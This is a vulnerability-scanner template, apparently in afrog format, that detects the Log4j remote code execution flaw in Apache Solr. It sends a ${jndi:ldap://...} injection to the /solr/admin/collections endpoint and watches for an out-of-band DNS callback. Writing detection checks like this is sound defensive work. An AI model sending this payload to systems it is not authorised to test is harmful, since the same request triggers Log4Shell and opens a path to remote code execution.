id: solr-log4j-rce

info:
  name: Apache Solr Log4j Remote Code Execution
  author: zan8in
  severity: critical
  verified: false
  description: |
    Apache Solr Log4j Remote Code Execution
  tags: solr,log4j,rce
  created: 2023/06/09

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: GET
      path: /solr/admin/collections?action=${jndi:ldap://{{oobDNS}}}&wt=json
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
